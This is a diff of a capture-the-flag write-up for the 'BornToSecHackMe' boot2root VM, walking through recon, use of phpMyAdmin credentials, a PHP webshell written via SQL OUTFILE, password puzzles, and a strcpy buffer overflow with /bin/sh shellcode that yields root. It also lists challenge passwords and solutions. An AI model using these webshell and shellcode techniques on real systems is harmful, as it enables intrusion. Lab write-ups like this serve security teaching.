@@ -4,36 +4,35 @@ nmap is a network tool usefull to scan an IP and find a lot of data about runnin
 
 dirb is a web content scanner used to find any hidden or existing web files and directories.
 
-1) Find your IP:
+1) Find our IP:
 
 ip a
 
-2) You will find your IP with the CIDR range. Usually /24
-scan your IP with nmap and display the list of running services:
+2) We will find our IP with the CIDR range. Usually /24
+We scan the IP with nmap and display the list of running services:
 
 nmap -sL <your_IP>
 
-in the list you will find the boot2root server with the corresponding IP:
+In the list we find the boot2root server with the corresponding IP:
 
-In my case:
+In our case:
 "Nmap scan report for borntosechackme.home (192.168.1.29)"
 
-3) scan the boot2root server with nmap. I chose to use -A flag. it stand for agressive scan. This way, a lot of informations will be displayed.
-Interesting informations like expired ssl certification will be displayed, the services versions etc.
+3) Scan the boot2root server with nmap with -sV or -A flags.
 
 nmap -A Nmap <BOOT2ROOT_IP>
 
-4) Here you can see a list of open port with the corresponding versions.
-- Appache
-- openssh
-- vsftpd
+4) Here we can see a list of open port with the corresponding versions.
+- Appache (2.2.22)
+- openssh (5.9p1)
+- vsftpd (2.0.8)
 etc
 
 5) Before searching for known vulnerabilities for theses versions, lets use dirb on our bornToSecHackMe IP
 
 dirb https://192.168.1.29/
 
-Here, you will see some interesting pages:
+Here, there is some interesting pages:
 <IP>/forum
 <IP>/forum/js
 <IP>/forum/templates_c
@@ -66,7 +65,7 @@ However, we can connect on the website.
 10) There is a mail with the object "DB ACCESS". There is a password for root user.
 But it is not the ssh credentials yet. It is a way to access the web DB.
 
-11) On https://<BOOT2ROOT_IP>/phpmyadmin, use root as ID and the password given in the mail.
+11) On https://<BOOT2ROOT_IP>/phpmyadmin, we use root as ID and the password given in the mail.
 
 12) We are root on the DB. Phpmyadmin is a GUI to handle table database and to make SQL queries.
 We will try to create a new php page through SQL with the intent to create a webshell.
@@ -78,6 +77,7 @@ INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
 
 13) Thanks to the webshell we can check the files in there:
 If we do "whoami" we see that we are www-data user.
+
 We try ls -la /
 
 We can see the various directories. /home directory is the one under www-data:
@@ -89,15 +89,15 @@ there is a file named password.
 We get another password for lmezard but still not the root password for bornToSecHackMe.
 
 14) It happens to be credentials for ftp. We can see its open port
-type ftp <IP_VM>
+ftp <IP_VM>
 
-14) We see a README and a fun files with ls.
+14) After connecting to ftp, we see a README and a fun files with ls.
 
 The README says to resolve the challenge to have ths ssh password for the user Laurie.
 
 The file fun have lot of data with .pcap result and //file numbers
 
-Among lot of useless data we can see C function with getme functions from 1 to 12
+Among lot of useless data we can see C function with getme<number>() functions from 1 to 12
 
 grep is not possible in ftp server so we download the fun file localy with get command:
 get fun
@@ -108,20 +108,38 @@ We grep with the -a option and can retrieve some interesting information.
 With different combination of grep, we can see that a series of twelve getme lead us to the password.
 It says to perform sha256sum on it afterward.
 
-	printf("%c",getme1());
-	printf("%c",getme2());
-	printf("%c",getme3());
-	printf("%c",getme4());
-	printf("%c",getme5());
-	printf("%c",getme6());
-	printf("%c",getme7());
-	printf("%c",getme8());
-	printf("%c",getme9());
-	printf("%c",getme10());
-	printf("%c",getme11());
-	printf("%c",getme12());
-	printf("\n");
-	printf("Now SHA-256 it and submit");
+strings fun | grep "printf" | grep -v "Got you"
+
+  		printf("M");
+        printf("Y");
+        printf(" ");
+        printf("P");
+        printf("A");
+        printf("S");
+        printf("S");
+        printf("W");
+        printf("O");
+        printf("R");
+        printf("D");
+        printf(" ");
+        printf("I");
+        printf("S");
+        printf(":");
+        printf(" ");
+        printf("%c",getme1());
+        printf("%c",getme2());
+        printf("%c",getme3());
+        printf("%c",getme4());
+        printf("%c",getme5());
+        printf("%c",getme6());
+        printf("%c",getme7());
+        printf("%c",getme8());
+        printf("%c",getme9());
+        printf("%c",getme10());
+        printf("%c",getme11());
+        printf("%c",getme12());
+        printf("\n");
+        printf("Now SHA-256 it and submit");
 
 By doing:
 file fun
@@ -137,13 +155,14 @@ The only problem is that the getme and the corresponding return are not always c
 
 We write a Bash script (test_fun.bash) to retrieve the relevant pieces of data:
 a) First, we get the usefull .pcap files
-b) Then we retrieve the file number and use it on the files name.
+b) Then we retrieve the file number and use it on the files name:
 c) We sort the files
 d) We get the return in the right order and display it.
 e) We use sha256sum like suggested in the printf.
 
 16) We can now connect in ssh with Laurie's password. Still not root.
-Another challenge. It is a binary called bomb. There is 6 phases to defuse the bin bomb and get another password, this time for the user Thor.
+Another challenge. It is a binary called bomb. 
+There is 6 phases to defuse the bin bomb and get another password, this time for the user Thor.
 
 We upload the binary to https://dogbolt.org/. It convert the binary to human readable code source.
 
@@ -164,9 +183,72 @@ Phase4: Fibonacci number resulting to 55. We copied the code and tried on our ow
 
 Phase5: [HERE: MATHS AGAIN ALED]
 
-Phase6: 
+Phase 6: The program waits for 6 digits, all between 1 and 6.
+All the digits must be different.
+Each digit represents the original position of a node in a linked list.
+The code rearranges the nodes according to the permutation and then checks the node values.
+
+The permutation 4 2 6 3 1 5 is the one that correctly orders the nodes to satisfy the descending condition.
+
+17) Now we have all the information to compute thor user's password.
+We concatenate all the answers of the six phases.
+
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+(We had to try different combination for the phase 3 because it didn't work with our first solution)
 
 
+18) Once connected to Thor session we see a file named turtle with instructions for deplacements.
+The file name is a hint because it is a python programm used for drawing.
+The README says again it will let us discover the password for Zaz.
+
+We create a python program:
+a) open the file
+b) read line by line and isolate each key word
+c) execute the corresponding instructions
+
+When we execute this program, a graphical windows open to show us the last password.
+The drawing form five letters: SLASH
+
+19) It does not work as it is to connect with zaz user. At the end of the file it written:
+"Can you digest the message?"
+It is an hint too since it refers to digest password method.
+The working command is:
+
+echo -n "SLASH" | md5sum
+
+20) We can now connect on Zaz session where we have the binary "exploit_me"
+By using strings or dogbolt we notice two main things:
+
+- the use of strcpy()
+- the binary wait for one argument
+
+We can use that to provoke a buffer overflow and executing a shellcode
+https://shell-storm.org/shellcode/index.html
 
 
+By trial and error we found the size needed to get outside the allocated buffer.
 
+export EXPLOIT=`python -c 'print "A" * 200 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+
+we save this exploit in a new environnement variable
+
+then with a short C code : 
+
+int main()
+{
+  printf("%p", getenv("EXPLOIT"));
+}
+
+We retrieve the memory adress of the variable.
+
+Then we can execute exploit_me with python -c : 
+./exploit_me $(python -c 'print "A" * 140 + "\x5b\xf8\xff\xbf"')
+
+We spawned a shell with root access. 
+
+whoami -> root
+
+when we do cat /root/*
+
+We have a congratulation message.
